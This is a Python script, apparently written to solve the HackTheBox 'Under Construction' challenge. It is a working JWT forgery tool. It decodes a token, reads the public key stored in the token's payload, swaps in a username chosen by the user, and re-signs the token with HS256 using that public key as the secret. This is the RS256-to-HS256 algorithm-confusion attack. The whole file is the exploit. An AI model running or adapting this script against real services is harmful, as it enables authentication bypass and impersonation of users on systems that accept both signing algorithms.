import json, base64, sys, os, jwt
from colorama import Fore, Style
intro = """
#################################################
#						#
#    JSON WebToken				#
#    	challenge: 				#
#     		hackthebox/under_construction	#
#						#
#################################################


"""
print(Fore.GREEN + intro)

token = input(Fore.WHITE + "TOKEN >> ")
try:
	header, payload, sign = token.split('.')
except ValueError:
	print(Fore.RED + "\n[-] Invalid token !")
	sys.exit(0)

os.system("clear")

header_dec = json.loads(base64.urlsafe_b64decode(header.encode('utf-8')).decode('utf-8'))
payload_dec = json.loads(base64.urlsafe_b64decode(payload.encode('utf-8')).decode('utf-8'))

print(Fore.GREEN + intro)

print(Fore.BLUE + "HEADER : " + Fore.WHITE, header_dec, end="\n\n")
print(Fore.BLUE + "PAYLOAD : " + Fore.WHITE, payload_dec ,end="\n\n")

public_key = payload_dec.get('pk')

command = input("Username value >> ")

if command.strip(' ') == payload_dec.get('username') or command == '':
	print(Fore.YELLOW + "[-] Nessuna modifica effettuata !")
	sys.exit(0)

payload_dec['username'] = command
out = jwt.encode(payload_dec, public_key, algorithm="HS256")

print(Fore.YELLOW + "[+] New Token: \n" + out.decode('utf-8'))





